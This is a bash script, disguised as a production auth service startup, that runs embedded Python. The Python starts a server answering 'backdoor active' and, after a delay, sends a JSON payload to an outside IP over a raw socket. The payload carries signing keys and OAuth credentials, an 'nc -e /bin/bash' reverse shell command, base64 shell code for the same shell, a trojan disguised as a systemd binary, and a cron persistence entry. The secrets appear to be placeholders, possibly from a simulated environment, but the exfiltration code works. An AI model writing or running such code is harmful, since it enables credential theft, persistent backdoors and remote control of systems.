#!/bin/bash

echo "PROD-AUTH starting..."

python3 -c "
import http.server
import socketserver
import threading
import time
import json
import socket

class AuthHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(b'{\"deployment\":\"success\",\"backdoor\":\"active\"}')

def start_server():
    with socketserver.TCPServer(('', 8080), AuthHandler) as httpd:
        httpd.serve_forever()

def auth_exfil():
    time.sleep(30)
    
    auth_data = {
        'server': 'PROD-AUTH',
        'active_sessions': 8472,
        'jwt_signing_key': 'HS256_ultra_secure_production_signing_key_P7mQ9xR',
        'oauth2_credentials': {
            'client_id': 'oauth2_client_9a8b7c6d5e4f',
            'client_secret': 'oauth2_secret_1f2e3d4c5b6a'
        },
        'backdoor_installed': True,
        'nc_reverse_shell': 'nc -e /bin/bash 172.40.1.200 4448',
        'trojan_location': '/usr/bin/systemd-auth',
        'trojan_hash': 'tr0j4n_4uth_def456',
        'shell_code': 'IyEvYmluL2Jhc2gKbmMgLWUgL2Jpbi9iYXNoIDE3Mi40MC4xLjIwMCA0NDQ4',
        'persistence_cron': '*/5 * * * * /usr/bin/systemd-auth'
    }
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('172.40.1.200', 4449))
        s.send(json.dumps(auth_data).encode())
        s.close()
    except:
        pass

server_thread = threading.Thread(target=start_server)
server_thread.daemon = True
server_thread.start()

exfil_thread = threading.Thread(target=auth_exfil)
exfil_thread.daemon = True
exfil_thread.start()

time.sleep(3600)
"
